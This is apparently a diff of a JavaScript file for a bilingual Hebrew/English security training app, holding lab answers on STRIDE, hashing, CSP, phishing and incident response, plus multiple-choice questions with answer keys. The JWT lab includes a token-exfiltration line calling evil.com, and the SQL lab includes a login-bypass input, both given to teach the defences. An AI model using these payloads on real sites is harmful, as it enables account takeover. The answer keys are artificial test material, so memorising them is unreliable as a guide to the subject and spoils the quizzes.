+  {q:"מצאי 3 פגיעויות בקוד הבא:\nquery = 'SELECT * FROM users WHERE user=\"'+input+'\" AND pass=\"'+pwd+'\"'",a:"פגיעות 1: SQL Injection\nInput: admin\" --\nQuery: SELECT * FROM users WHERE user=\"admin\" --\" AND pass=...\nתוצאה: login ללא סיסמה!\n\nפגיעות 2: שגיאת פרטים\nאם מחזיר 'user not found' vs 'wrong password' — username enumeration\n\nפגיעות 3: אחסון סיסמאות\n(לא נראה בקוד אבל סביר) — hash ישירות? MD5? ללא salt?\n\n✅ תיקון:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE user=? AND pass_hash=?');\n$stmt->execute([$input, password_hash($pwd, PASSWORD_BCRYPT)]);"},
+  {q:"איך תממשי Content Security Policy לאתר עם Google Analytics?",a:"CSP Header לאתר עם Google Analytics:\n\nContent-Security-Policy:\n  default-src 'self';\n  script-src 'self' https://www.google-analytics.com https://www.googletagmanager.com;\n  img-src 'self' https://www.google-analytics.com data:;\n  connect-src 'self' https://www.google-analytics.com;\n  style-src 'self' 'unsafe-inline';\n  font-src 'self' https://fonts.gstatic.com;\n  frame-ancestors 'none';\n  base-uri 'self';\n  form-action 'self';\n\nב-nginx:\nadd_header Content-Security-Policy \"default-src 'self'; ...\";\n\nבדיקה: Chrome DevTools → Security → CSP violations\nReport-Only mode קודם: Content-Security-Policy-Report-Only"},
+  {q:"מה OWASP A01 Broken Access Control ואיך מונעים?",a:"Broken Access Control — הנפוץ ביותר (OWASP #1):\n\nדוגמאות:\n1. IDOR: GET /api/users/42 → GET /api/users/43 → גישה לuser אחר\n2. Forced Browsing: /admin → עמוד admin ללא check\n3. JWT manipulation: role=user → role=admin בpayload\n\nהגנות:\n1. Deny by default — כל מה שלא מורשה מפורשות = חסום\n2. Server-side authorization על כל request (לא client-side)\n3. UUID במקום sequential IDs — קשה לנחש\n4. Resource-based check: SELECT * WHERE id=? AND user_id=?\n5. Audit logging: כל unauthorized access מתועד\n\nבדיקה:\nBurp Suite → Repeater → שנה IDs ובדוק תגובות"}
+],
+4:[
+  {q:"הסבירי למפתח מדוע לא לאחסן JWT secrets ב-localStorage.",a:"localStorage הוא XSS-accessible!\n\nאם יש XSS vulnerability בהיכלשהו באתר:\nfetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))\n\nTוקף גונב את הJWT ויכול להתחזות לmשתמש לכל חיי הtoken.\n\n✅ במקום זה:\n1. HttpOnly Cookie — JavaScript לא יכול לגשת אליו בכלל\n2. Secure flag — רק HTTPS\n3. SameSite=Strict — מגן מCSRF\n\nסיכום:\nlocalStorage → vulnerable to XSS\nHttpOnly Cookie → immune to XSS (אבל לא CSRF)\nHttpOnly + SameSite=Strict + CSRF token → best"},
+  {q:"תכנני MFA flow לאפליקציה. אילו פקטורים, איזה רמה לכל user type?",a:"MFA Tiered Policy:\n\nRegular User:\n- Login: password + TOTP app (Google Authenticator)\n- Sensitive action (payment, password change): TOTP confirmation\n- Fallback: email OTP (backup only)\n\nAdmin User:\n- Login: password + Hardware key (YubiKey/FIDO2)\n- Elevated actions: re-authenticate + Hardware key\n- No SMS fallback\n\nService Account / API:\n- Certificate-based authentication\n- IP whitelist + short-lived tokens\n- No interactive MFA (automated)\n\nImplementation:\n1. Recovery codes: 10 one-time codes בhash\n2. Remember device: 30 יום, browser fingerprint\n3. Suspicious login: מיקום חדש → MFA תמיד\n4. Audit log: כל MFA success/failure"}
+],
+5:[
+  {q:"קיבלת email מ-'CEO' שמבקש העברת $50,000 דחופה. כיצד מגיבה?",a:"זוהי Whaling/CEO Fraud attack!\n\nסימני האזהרה:\n1. דחיפות מלאכותית — 'עכשיו'\n2. בקשה לעקוף נהלים רגילים\n3. CEO ישיר לפינאנס — מעקף approval chain\n4. 'סודי' — מונע מcontact עם אחרים\n\nכיצד מגיבה:\n1. אל תגיבי למייל ישירות\n2. התקשרי לCEO במספר שאת יודעת (לא מהmail)\n3. בדקי Header של המייל — Reply-To שונה? דומיין מזויף?\n4. דווחי לIT/Security מיידית\n5. אם כבר שולחת: יצרי קשר עם הבנק לעצירת העברה\n\nמניעה בארגון:\n1. Dual-approval לכל העברה מעל $10K\n2. DMARC/SPF/DKIM על הדומיין\n3. Security awareness training"},
+  {q:"כיצד הייתה מזהה phishing email? 5 סימני זיהוי.",a:"5 סימני זיהוי לphishing:\n\n1. 🔗 URL מוסתר:\n   נראה: 'לחצי כאן לאמת חשבונך'\n   האמיתי: http://paypa1.com/verify (1 במקום l!)\n   → Hover על הקישור לפני לחיצה\n\n2. 📧 שגיאות בדומיין שולח:\n   support@paypal-security-alert.com במקום support@paypal.com\n   או display name 'PayPal Support' עם כתובת שונה\n\n3. ⚡ דחיפות מלאכותית:\n   'חשבונך יינעל תוך 24 שעות אם לא תפעלי עכשיו!'\n\n4. 📝 שגיאות כתיב/דקדוק:\n   (פחות נפוץ עם AI, אבל עדיין קיים)\n\n5. 📎 קבצים מצורפים לא צפויים:\n   Invoice.pdf.exe, report.docx עם macro\n   → ארגון לגיטימי לא שולח .exe\n\nבדיקה: headers מלאים, MX record של דומיין"}
+],
+6:[
+  {q:"שרת production של החברה מתנהג חריג: פתאום שולח הרבה נתונים לIP חיצוני. פרטי את ה-IR שלך.",a:"Incident Response — Suspicious Outbound Traffic:\n\nשלב 1: Detection & Analysis (10 דקות ראשונות)\n- date → timestamp תחילת חקירה\n- netstat -tulnap | grep ESTABLISHED → connections פעילים\n- whois <external_IP> → מי ה-IP?\n- ps auxf → תהליכים חשודים\n- lsof -i → open network files\n\nשלב 2: Containment (מיידי אם confirmed)\n- בידוד: disconnect network (לא shutdown — שימור RAM)\n- נעל credentials: שנה passwords של accounts על השרת\n- Revoke API keys של השרת\n\nשלב 3: Evidence Collection\n- dd if=/dev/mem of=mem.dump (אם אפשרי)\n- netstat, ps, lsof — שמור output לקובץ\n- logs: /var/log/auth.log, syslog, nginx/apache\n- find / -mtime -1 → קבצים שונו\n\nשלב 4: Notify\n- Security team, Management\n- אם PII נפגע: GDPR 72h reporting\n\nשלב 5: Eradication & Recovery\n- Rebuild from known-good image (לא clean)\n- Deploy patches\n- Enhanced monitoring"},
+  {q:"מה IOC ומה הבדל בין IOC ל-TTP?",a:"IOC = Indicator of Compromise:\nראיות ספציפיות שpוinfected system:\n- MD5/SHA256 hash של malware file\n- IP address חשוד (C2 server)\n- Domain name (evil.example.com)\n- Registry key שנוצר\n- Scheduled task חשוד\n- URL pattern\n\nTTP = Tactics, Techniques, Procedures:\nהDNA של תוקף — איך הוא עובד:\n- Tactic: גנבת credentials (מה)\n- Technique: credential dumping מLSASS (איך)\n- Procedure: שימוש בmimikatz (הכלי הספציפי)\n\nהבדל עיקרי:\nIOC = low-level, specific, expires quickly (IPs משתנים)\nTTP = strategic, long-lasting (APT29 תמיד עובד כך)\n\nMITRE ATT&CK = מיפוי גדול של TTPs לפי קבוצות תקיפה"}
+],
+7:[
+  {q:"החברה מפתחת אפליקציה רפואית. אילו רגולציות חלות ומה צריך ליישם?",a:"רגולציות רלוונטיות:\n\n1. GDPR (אם משרתים EU):\n   - Health data = Special Category Data (הגנה מוגברת)\n   - DPIA חובה לפני launch\n   - 72h breach notification\n   - Data minimization — אל תאסף מה שלא צריך\n\n2. HIPAA (אם משרתים US):\n   - PHI (Protected Health Information) חייב הצפנה\n   - BAA עם כל cloud provider\n   - Audit logs על כל גישה\n\n3. ISO 27001:\n   - ISMS — Information Security Management System\n   - Annual penetration testing\n\nיישום טכני:\n✅ Encryption at rest (AES-256) ו-in transit (TLS 1.3)\n✅ Role-based access: doctor רואה patients שלו\n✅ Audit log על כל data access\n✅ Data retention policy\n✅ Breach response plan\n✅ Annual security training"},
+  {q:"הגדרי Risk Assessment לאחד מהסיכונים: RDP חשוף לinternet על שרת Windows.",a:"Risk Assessment — RDP חשוף:\n\nזיהוי הסיכון:\nRDP (port 3389) פתוח לinternet + Windows Server = target להתקפה\n\nThreat Actors:\n- Ransomware operators (REvil, LockBit)\n- Cryptominer operators\n- Script kiddies עם Shodan\n\nLikelihood: גבוהה מאוד\nShodan מחזיר מיליוני RDP חשופים. bots סורקים תמידית.\n\nImpact: גבוה מאוד\n- Full server compromise\n- Ransomware deployment\n- Data theft\n- Lateral movement לרשת הארגונית\n\nRisk = High × High = CRITICAL\n\nRecommended Treatment: Mitigate (לא Accept!)\n1. סגור port 3389 מinternet מיידית\n2. VPN בלבד לRDP access\n3. MFA על ה-VPN\n4. Jump server / Bastion host\n5. אם חייבים RDP חשוף: Azure AD + Conditional Access\n\nResidual Risk לאחר: Low"}
+]};
+
+const LABS_EN = {
+0:[
+  {q:"An organization stores health data of 5M customers. Identify three most relevant STRIDE threats.",a:"1. Information Disclosure — leaking medical records (CIA: Confidentiality)\n2. Tampering — modifying test results (CIA: Integrity)\n3. DoS — taking down a hospital system (CIA: Availability)\n\nRemaining STRIDE: Spoofing (relevant), Repudiation (audit logs critical), Elevation of Privilege (DB admin access)."},
+  {q:"How would you build a threat model for a login API? What are the threats and defenses?",a:"STRIDE on /api/login:\n\nSpoofing: Credential stuffing, Brute force\n→ Rate limiting, MFA, CAPTCHA, account lockout\n\nTampering: Request modification (user→admin)\n→ Server-side validation, never trust client data\n\nInformation Disclosure: Overly detailed error messages\n→ Generic errors, don't expose 'user not found' vs 'wrong password'\n\nDoS: API flooding\n→ Rate limit per IP/user, CDN, WAF\n\nElevation: SQL injection into the SQL query\n→ Parameterized queries, ORM"}
+],
+1:[
+  {q:"Explain to a non-technical manager why bcrypt is better than SHA-256 for passwords.",a:"SHA-256 is instant. An nvidia RTX 4090 tries 8 billion SHA-256 hashes per second.\nbcrypt is designed to be slow. Same GPU: 100K bcrypt per second.\n'Password123' with bcrypt: ~10 seconds to crack instead of instant.\n\nTogether: strong password + bcrypt + salting = years to crack instead of seconds."},
+  {q:"What is the difference between symmetric and asymmetric encryption and when to use each?",a:"Symmetric (AES):\n✅ Very fast — practical for GBs of data\n✅ Dedicated hardware (AES-NI instructions)\n❌ Key distribution problem — how to securely share the key?\n\nAsymmetric (RSA, ECC):\n✅ No distribution problem — public key is open\n❌ Much slower — practical only for small amounts of data\n\nIn practice: HYBRID!\nTLS Handshake:\n1. Asymmetric → securely exchange session key\n2. Symmetric (AES) → encrypt all data in flight\nThis is what happens in every HTTPS request you make."}
+],
+2:[
+  {q:"Analyze the following log and determine if there's suspicious activity:\n192.168.1.100 GET /login 200\n192.168.1.100 POST /login 401\n(×500 similar lines)\n192.168.1.100 POST /login 200",a:"Analysis:\n🚨 Credential Stuffing / Brute Force Attack\n\nEvidence:\n1. Same IP (192.168.1.100) — 500+ attempts\n2. POST /login ×500 = login attempts\n3. All 401 (Unauthorized) until finally 200 (Success)\n4. Continuous pattern = automated, not human\n\nImmediate response:\n1. Block IP 192.168.1.100\n2. Lock the account that logged in (possibly compromised)\n3. Check what the account did after the 200\n4. Enable MFA if not active\n5. Alert security team\n\nPrevention: Rate limiting (5 attempts/minute), CAPTCHA, fail2ban"}
+],
+3:[
+  {q:"Find 3 vulnerabilities in this code:\nquery = 'SELECT * FROM users WHERE user=\"'+input+'\" AND pass=\"'+pwd+'\"'",a:"Vulnerability 1: SQL Injection\nInput: admin\" --\nQuery: SELECT * FROM users WHERE user=\"admin\" --\" AND pass=...\nResult: login without password!\n\nVulnerability 2: Error disclosure\nIf returning 'user not found' vs 'wrong password' — username enumeration\n\nVulnerability 3: Password storage\n(Not in code but likely) — direct hash? MD5? Without salt?\n\n✅ Fix:\n$stmt = $pdo->prepare('SELECT * FROM users WHERE user=? AND pass_hash=?');\n$stmt->execute([$input, password_hash($pwd, PASSWORD_BCRYPT)]);"}
+],
+4:[
+  {q:"Explain to a developer why not to store JWT secrets in localStorage.",a:"localStorage is XSS-accessible!\n\nIf there's any XSS vulnerability anywhere on the site:\nfetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))\n\nAttacker steals the JWT and can impersonate the user for the token's lifetime.\n\n✅ Instead:\n1. HttpOnly Cookie — JavaScript cannot access it at all\n2. Secure flag — HTTPS only\n3. SameSite=Strict — protects from CSRF\n\nSummary:\nlocalStorage → vulnerable to XSS\nHttpOnly Cookie → immune to XSS (but not CSRF)\nHttpOnly + SameSite=Strict + CSRF token → best"}
+],
+5:[
+  {q:"You received an email from the 'CEO' requesting an urgent $50,000 transfer. How do you respond?",a:"This is a Whaling/CEO Fraud attack!\n\nWarning signs:\n1. Artificial urgency — 'right now'\n2. Request to bypass normal procedures\n3. CEO directly to finance — bypassing approval chain\n4. 'Confidential' — prevents contacting others\n\nHow to respond:\n1. Don't reply to the email directly\n2. Call the CEO at a number you know (not from the email)\n3. Check the email header — different Reply-To? Spoofed domain?\n4. Report to IT/Security immediately\n5. If already sent: contact bank to stop the transfer\n\nOrganic prevention:\n1. Dual-approval for any transfer over $10K\n2. DMARC/SPF/DKIM on the domain\n3. Security awareness training"}
+],
+6:[
+  {q:"A production server is behaving strangely: suddenly sending lots of data to an external IP. Outline your IR.",a:"Incident Response — Suspicious Outbound Traffic:\n\nPhase 1: Detection & Analysis (first 10 minutes)\n- date → timestamp start\n- netstat -tulnap | grep ESTABLISHED → active connections\n- whois <external_IP> → who is the IP?\n- ps auxf → suspicious processes\n\nPhase 2: Containment (immediate if confirmed)\n- Isolate: disconnect network (NOT shutdown — preserve RAM)\n- Lock credentials: change passwords of accounts on server\n- Revoke server API keys\n\nPhase 3: Evidence Collection\n- logs: /var/log/auth.log, syslog\n- find / -mtime -1 → recently changed files\n\nPhase 4: Notify\n- Security team, Management\n- If PII affected: GDPR 72h reporting\n\nPhase 5: Eradication & Recovery\n- Rebuild from known-good image\n- Deploy patches\n- Enhanced monitoring"}
+],
+7:[
+  {q:"Your company is developing a medical app. What regulations apply and what must be implemented?",a:"Applicable regulations:\n\n1. GDPR (if serving EU):\n   - Health data = Special Category Data (enhanced protection)\n   - DPIA required before launch\n   - 72h breach notification\n   - Data minimization\n\n2. HIPAA (if serving US):\n   - PHI must be encrypted\n   - BAA with every cloud provider\n   - Audit logs on all access\n\nTechnical implementation:\n✅ Encryption at rest (AES-256) and in transit (TLS 1.3)\n✅ Role-based access: doctor sees only their patients\n✅ Audit log on every data access\n✅ Data retention policy\n✅ Breach response plan\n✅ Annual security training"}
+]};
+
+const GAME_QS = {
+0:[
+  {q:"CIA Triad =",o:["Confidentiality, Integrity, Availability","Control, Identity, Access","Crypto, Intel, Auth","Cyber, Info, Assurance"],a:0},
+  {q:"STRIDE — S =",o:["Scanning","Sniffing","Spoofing","Scripting"],a:2},
+  {q:"Defense in Depth =",o:["firewall חזק","הגנה בשכבות","הצפנה בלבד","backup"],a:1},
+  {q:"Colonial Pipeline נפרץ דרך:",o:["SQLi","VPN ללא MFA","XSS","zero-day"],a:1},
+  {q:"STRIDE — T = Tampering =",o:["מחיקה","שינוי נתונים","גנבה","ריגול"],a:1},
+  {q:"Repudiation = הכחשת",o:["זהות","פעולה","נתונים","גישה"],a:1},
+  {q:"DoS attack מכוון ל:",o:["Confidentiality","Integrity","Availability","Authentication"],a:2},
+  {q:"'Need to know' principle שמר על:",o:["Integrity","Availability","Confidentiality","Authorization"],a:2}
+],
+1:[
+  {q:"AES mode המומלץ:",o:["ECB","CBC","GCM","CFB"],a:2},
+  {q:"לסיסמאות משתמשים: hash מתאים:",o:["SHA-256","MD5","bcrypt","SHA-1"],a:2},
+  {q:"MD5 שבור כי:",o:["איטי מדי","collision attacks","לא חינמי","רק Linux"],a:1},
+  {q:"TLS משתמש ב:",o:["רק symmetric","רק asymmetric","hybrid — שניהם","רק hashing"],a:2},
+  {q:"ed25519 עדיף RSA כי:",o:["ישן יותר","קצר ומהיר","ארוך יותר","בלינוקס בלבד"],a:1},
+  {q:"SHA-1 deprecated כי:",o:["ארוך מדי","collision נמצאה","מהיר מדי","ישן"],a:1},
+  {q:"AES = encryption מסוג:",o:["Asymmetric","Hash","Symmetric","MAC"],a:2},
+  {q:"PKI = Public Key",o:["Interface","Infrastructure","Integrity","Identity"],a:1}
+],
+2:[
+  {q:"IPS vs IDS — IPS גם:",o:["מתריע","חוסם","מנטר","מדווח"],a:1},
+  {q:"Zero Trust עיקרון:",o:["סמוך אם בפנים","לעולם אל תסמוך","firewall בכניסה","VPN תמיד"],a:1},
+  {q:"Stateful firewall עוקב אחרי:",o:["IPs","Ports","Connections","Packets"],a:2},
+  {q:"DMZ מוצב בין:",o:["users","internet ו-internal network","DB ו-app","firewall ו-router"],a:1},
+  {q:"SolarWinds = התקפת:",o:["phishing","supply chain","brute force","SQLi"],a:1},
+  {q:"WAF מגן ספציפית על:",o:["email","web applications","databases","endpoints"],a:1},
+  {q:"Network segmentation מגביל:",o:["DDoS","lateral movement","phishing","SQLi"],a:1},
+  {q:"NGFW כולל:",o:["only IP filtering","Deep Packet Inspection","VPN only","DNS only"],a:1}
+],
+3:[
+  {q:"SQLi נמנע עם:",o:["firewall","parameterized queries","rate limiting","HTTPS"],a:1},
+  {q:"XSS Stored = script מאוחסן ב:",o:["browser","database","server cache","CDN"],a:1},
+  {q:"CSP מגן מ:",o:["SQLi","XSS","MITM","DoS"],a:1},
+  {q:"OWASP A01 =",o:["Injection","Broken Access Control","Crypto Failures","DoS"],a:1},
+  {q:"CSRF נמנע עם:",o:["HTTPS","SameSite cookies + CSRF token","input validation","rate limit"],a:1},
+  {q:"British Airways נפגעה מ:",o:["SQLi","Magecart JS script","account takeover","DDoS"],a:1},
+  {q:"OWASP A03 =",o:["Broken Access","Injection","Crypto Failures","Logging"],a:1},
+  {q:"HttpOnly cookie מגן מ:",o:["CSRF","XSS — JS לא יכול לגשת","SQLi","MITM"],a:1}
+],
+4:[
+  {q:"MFA הכי חזק:",o:["SMS OTP","TOTP App","Hardware Key (FIDO2)","email OTP"],a:2},
+  {q:"JWT Payload:",o:["מוצפן","base64 encoded — קריא","מאובטח","בserver"],a:1},
+  {q:"OAuth = Authorization",o:["Encryption","Delegation","Authentication","Protocol"],a:1},
+  {q:"SMS MFA חלש בגלל:",o:["לא בiOS","SIM swapping","לא GDPR","קצר מדי"],a:1},
+  {q:"Least Privilege =",o:["נעל הכל","מינימום הרשאות","גישה מלאה","לפי בקשה"],a:1},
+  {q:"Okta נפגעה דרך:",o:["weak pass","support system לprod","SQLi","phishing"],a:1},
+  {q:"alg:none JWT attack =",o:["מאיץ JWT","מסיר signature check","מצפין יותר","מגדיל token"],a:1},
+  {q:"RBAC = Role-Based",o:["Risk Control","Access Control","Auth Check","Record Control"],a:1}
+],
+5:[
+  {q:"Spear Phishing = phishing",o:["המוני","ממוקד לאדם","בSMS","בטלפון"],a:1},
+  {q:"WannaCry השתמש ב:",o:["XSS","EternalBlue SMBv1","SQLi","phishing"],a:1},
+  {q:"Double Extortion =",o:["כופר כפול","הצפנה + גנבה","שתי קבוצות","שתי מטבעות"],a:1},
+  {q:"Whaling מכוון ל:",o:["רשת WiFi","C-level executives","server DB","API"],a:1},
+  {q:"91% ממתקפות מתחילות ב:",o:["zero-day","phishing email","brute force","SQLi"],a:1},
+  {q:"Vishing = phishing בdרך:",o:["email","טלפון","SMS","web"],a:1},
+  {q:"Ransomware Initial Access נפוץ:",o:["zero-day","phishing ו-RDP","supply chain","physical"],a:1},
+  {q:"APT = Advanced Persistent",o:["Threat","Trojan","Traffic","Test"],a:0}
+],
+6:[
+  {q:"Order of Volatility — ראשון לשמור:",o:["Disk","Logs","RAM","CPU registers"],a:3},
+  {q:"Containment phase של IR:",o:["מחק malware","בדד מערכות","דווח לרגולטור","חזור לפעילות"],a:1},
+  {q:"MTTR ממוצע לzיהוי breach:",o:["7 ימים","30 ימים","207 ימים","1 ימים"],a:2},
+  {q:"IOC דוגמה:",o:["firewall rule","IP חשוד","password policy","backup schedule"],a:1},
+  {q:"Equifax לא זיהתה 76 יום כי:",o:["אין לוגים","SSL inspection כבוי","אין firewall","אין backup"],a:1},
+  {q:"Eradication phase =",o:["זיהוי","בידוד","ניקוי מלא","חזרה לפעילות"],a:2},
+  {q:"SIEM =",o:["Security Info & Event Mgmt","Secure Internet Endpoint","System Integration","Security Incident Eval"],a:0},
+  {q:"Forensic image = copy של disk שהיא:",o:["compressed","bit-for-bit exact","encrypted","filtered"],a:1}
+],
+7:[
+  {q:"GDPR דיווח breach תוך:",o:["24h","48h","72h","1 week"],a:2},
+  {q:"GDPR קנס מקסימלי:",o:["€1M","€10M","4% מחזור שנתי","1% הכנסה"],a:2},
+  {q:"Risk Transfer =",o:["הצפנת נתונים","ביטוח סייבר","העברה לענן","שיתוף שותף"],a:1},
+  {q:"Privacy by Design =",o:["הצפנה בלבד","אבטחה בתכנון מהיום הראשון","מחיקת נתונים","audit logs"],a:1},
+  {q:"SOC 2 Type II בודק:",o:["snapshot","תקופת זמן","רק הצפנה","רק גישה"],a:1},
+  {q:"ISO 27001 = תקן ל:",o:["web security","ISMS ניהול אבטחה","PCI","HIPAA"],a:1},
+  {q:"DPIA נדרש ל:",o:["כל אפליקציה","עיבוד נתונים בסיכון גבוה","login רגיל","backup"],a:1},
+  {q:"PCI DSS נדרש למי שמעבד:",o:["medical data","credit card data","user emails","GPS data"],a:1}
+]};
+
+const GAME_QS_EN = {
+0:[
+  {q:"CIA Triad stands for:",o:["Confidentiality, Integrity, Availability","Control, Identity, Access","Crypto, Intel, Auth","Cyber, Info, Assurance"],a:0},
+  {q:"STRIDE — S stands for:",o:["Scanning","Sniffing","Spoofing","Scripting"],a:2},
+  {q:"Defense in Depth =",o:["One strong firewall","Multiple security layers","Encryption only","Backup only"],a:1},
+  {q:"Colonial Pipeline was breached via:",o:["SQLi","VPN without MFA","XSS","zero-day"],a:1},
+  {q:"Tampering threatens:",o:["Confidentiality","Integrity","Availability","Authentication"],a:1},
+  {q:"DoS attacks target:",o:["Confidentiality","Integrity","Availability","Authentication"],a:2},
+  {q:"Need-to-know protects:",o:["Integrity","Availability","Confidentiality","Authorization"],a:2},
+  {q:"Repudiation = denying:",o:["Identity","An action","Data","Access"],a:1}
+],
+1:[
+  {q:"Recommended AES mode:",o:["ECB","CBC","GCM","CFB"],a:2},
+  {q:"For user passwords, the correct hash is:",o:["SHA-256","MD5","bcrypt","SHA-1"],a:2},
+  {q:"MD5 is broken because of:",o:["Too slow","Collision attacks","Not free","Linux only"],a:1},
+  {q:"TLS uses:",o:["Symmetric only","Asymmetric only","Hybrid — both","Hashing only"],a:2},
+  {q:"ed25519 beats RSA because:",o:["It's older","Shorter and faster","Longer key","Linux only"],a:1},
+  {q:"SHA-1 deprecated because:",o:["Too long","Collision found","Too fast","Outdated"],a:1},
+  {q:"AES encryption type:",o:["Asymmetric","Hash","Symmetric","MAC"],a:2},
+  {q:"PKI = Public Key:",o:["Interface","Infrastructure","Integrity","Identity"],a:1}
+],
+2:[
+  {q:"IPS vs IDS — IPS also:",o:["Alerts","Blocks","Monitors","Reports"],a:1},
+  {q:"Zero Trust principle:",o:["Trust if inside","Never trust, always verify","Firewall at entry","VPN always"],a:1},
+  {q:"Stateful firewall tracks:",o:["IPs","Ports","Connections","Packets"],a:2},
+  {q:"SolarWinds = attack type:",o:["Phishing","Supply chain","Brute force","SQLi"],a:1},
+  {q:"WAF specifically protects:",o:["Email","Web applications","Databases","Endpoints"],a:1},
+  {q:"Network segmentation limits:",o:["DDoS","Lateral movement","Phishing","SQLi"],a:1},
+  {q:"NGFW includes:",o:["IP filtering only","Deep Packet Inspection","VPN only","DNS only"],a:1},
+  {q:"DMZ sits between:",o:["Users","Internet and internal network","DB and app","Firewall and router"],a:1}
+],
+3:[
+  {q:"SQLi prevented with:",o:["Firewall","Parameterized queries","Rate limiting","HTTPS"],a:1},
+  {q:"Stored XSS stores script in:",o:["Browser","Database","Server cache","CDN"],a:1},
+  {q:"CSP protects against:",o:["SQLi","XSS","MITM","DoS"],a:1},
+  {q:"OWASP A01 =",o:["Injection","Broken Access Control","Crypto Failures","DoS"],a:1},
+  {q:"CSRF prevented with:",o:["HTTPS","SameSite cookies + CSRF token","Input validation","Rate limit"],a:1},
+  {q:"British Airways was hit by:",o:["SQLi","Magecart JS script","Account takeover","DDoS"],a:1},
+  {q:"HttpOnly cookie protects from:",o:["CSRF","XSS — JS can't access","SQLi","MITM"],a:1},
+  {q:"OWASP A03 =",o:["Broken Access","Injection","Crypto Failures","Logging"],a:1}
+],
+4:[
+  {q:"Strongest MFA:",o:["SMS OTP","TOTP App","Hardware Key (FIDO2)","Email OTP"],a:2},
+  {q:"JWT Payload:",o:["Encrypted","Base64 encoded — readable","Secured","Stored on server"],a:1},
+  {q:"OAuth = Authorization:",o:["Encryption","Delegation","Authentication","Protocol"],a:1},
+  {q:"SMS MFA weak because of:",o:["Not on iOS","SIM swapping","Not GDPR","Too short"],a:1},
+  {q:"Least Privilege =",o:["Lock everything","Minimum required permissions","Full access","On request"],a:1},
+  {q:"alg:none JWT attack:",o:["Speeds up JWT","Removes signature check","More encryption","Bigger token"],a:1},
+  {q:"RBAC = Role-Based:",o:["Risk Control","Access Control","Auth Check","Record Control"],a:1},
+  {q:"Okta breach was via:",o:["Weak password","Support system with prod access","SQLi","Phishing"],a:1}
+],
+5:[
+  {q:"Spear Phishing = phishing that's:",o:["Mass","Targeted at individual","By SMS","By phone"],a:1},
+  {q:"WannaCry used:",o:["XSS","EternalBlue SMBv1","SQLi","Phishing"],a:1},
+  {q:"Double Extortion =",o:["Double ransom","Encrypt + steal data","Two groups attack","Two currencies"],a:1},
+  {q:"Whaling targets:",o:["WiFi networks","C-level executives","Server DB","API"],a:1},
+  {q:"91% of attacks start with:",o:["Zero-day","Phishing email","Brute force","SQLi"],a:1},
+  {q:"Vishing = phishing via:",o:["Email","Phone","SMS","Web"],a:1},
+  {q:"Common ransomware Initial Access:",o:["Zero-day","Phishing and RDP","Supply chain","Physical"],a:1},
+  {q:"APT = Advanced Persistent:",o:["Threat","Trojan","Traffic","Test"],a:0}
+],
+6:[
+  {q:"Order of Volatility — preserve first:",o:["Disk","Logs","RAM","CPU registers"],a:3},
+  {q:"Containment phase of IR:",o:["Delete malware","Isolate systems","Report to regulator","Restore operations"],a:1},
+  {q:"Average MTTR to detect breach:",o:["7 days","30 days","207 days","1 day"],a:2},
+  {q:"IOC example:",o:["Firewall rule","Suspicious IP","Password policy","Backup schedule"],a:1},
+  {q:"Equifax didn't detect for 76 days because:",o:["No logs","SSL inspection disabled","No firewall","No backup"],a:1},
+  {q:"Eradication phase =",o:["Detection","Isolation","Full cleanup","Restore operations"],a:2},
+  {q:"SIEM stands for:",o:["Security Info & Event Mgmt","Secure Internet Endpoint","System Integration","Security Incident Eval"],a:0},
+  {q:"Forensic image is a disk copy that is:",o:["Compressed","Bit-for-bit exact","Encrypted","Filtered"],a:1}
+],
+7:[
+  {q:"GDPR breach notification within:",o:["24h","48h","72h","1 week"],a:2},
+  {q:"GDPR maximum fine:",o:["€1M","€10M","4% annual global turnover","1% revenue"],a:2},
+  {q:"Risk Transfer =",o:["Data encryption","Cyber insurance","Cloud migration","Partner sharing"],a:1},
+  {q:"Privacy by Design =",o:["Encryption only","Security in design from day one","Data deletion","Audit logs"],a:1},
+  {q:"SOC 2 Type II tests:",o:["A snapshot","Over a time period","Encryption only","Access only"],a:1},
+  {q:"ISO 27001 standard for:",o:["Web security","ISMS security management","PCI","HIPAA"],a:1},
+  {q:"DPIA required for:",o:["Every app","High-risk data processing","Regular login","Backup"],a:1},
+  {q:"PCI DSS required for who processes:",o:["Medical data","Credit card data","User emails","GPS data"],a:1}
+]};
+// ===== STATE =====
+const state = {cur:0, tabs:{}, quiz:{}, game:{}, xp:0, stars:{}};
+let currentLang = 'he';
+let gameTimer = null;
+const TOTAL_CHAPTERS = 8;
+
+// ===== HELPERS =====
+function L() { return currentLang==='he' ? C.he : C.en; }
+
+function getQ(i) {
+  const key = currentLang+'-'+i;
+  if (!_sqCache[key]) {
+    const raw = (currentLang==='en' ? (QUIZZES_EN[i]||QUIZZES[i]) : QUIZZES[i]) || QUIZZES[0];
+    _sqCache[key] = raw.map(q => shuffleOptions(q));
+  }
+  return _sqCache[key];
+}
+function getL(i) { return (currentLang==='en' ? (LABS_EN[i]||LABS[i]) : LABS[i]) || LABS[0]; }
+function getG(i) {
+  const key = currentLang+'-g-'+i;
+  if (!_sgCache[key]) {
+    const raw = (currentLang==='en' ? (GAME_QS_EN[i]||GAME_QS[i]) : GAME_QS[i]) || GAME_QS[0];
+    _sgCache[key] = raw.map(q => shuffleOptions(q));
+  }
+  return _sgCache[key];
+}
+const _sqCache = {}, _sgCache = {};
+
+// ===== NORMALIZE + SHUFFLE (length bias fix) =====
+function normalizeOptions(q) {
+  const lens = q.o.map(o => o.length);
+  const wrongLens = lens.filter((_, i) => i !== q.a);
+  const maxWrong = Math.max(...wrongLens);
+  const cap = maxWrong;
+  const newOpts = q.o.map(o => {
+    if (o.length <= cap) return o;
+    let t = o.slice(0, cap);
+    const ls = t.lastIndexOf(' ');
+    if (ls > cap * 0.5) t = t.slice(0, ls);
+    return t;
+  });
+  return { ...q, o: newOpts };
+}
+function shuffleOptions(q) {
+  const norm = normalizeOptions(q);
+  const idx = [0,1,2,3];
+  for (let i = idx.length-1; i > 0; i--) {
+    const j = Math.floor(Math.random()*(i+1));
+    [idx[i],idx[j]] = [idx[j],idx[i]];
+  }
+  return { ...norm, o: idx.map(i=>norm.o[i]), a: idx.indexOf(norm.a) };
+}
+
+// ===== INIT =====
+document.addEventListener('DOMContentLoaded', () => {
+  applyLang('he');
+  showChapter(0);
+});
+
+// ===== LANG =====
+function toggleLang() { currentLang = currentLang==='he'?'en':'he'; applyLang(currentLang); }
+
+function applyLang(lang) {
+  currentLang = lang;
+  const Lc = L();
+  document.documentElement.setAttribute('lang', lang==='he'?'he':'en');
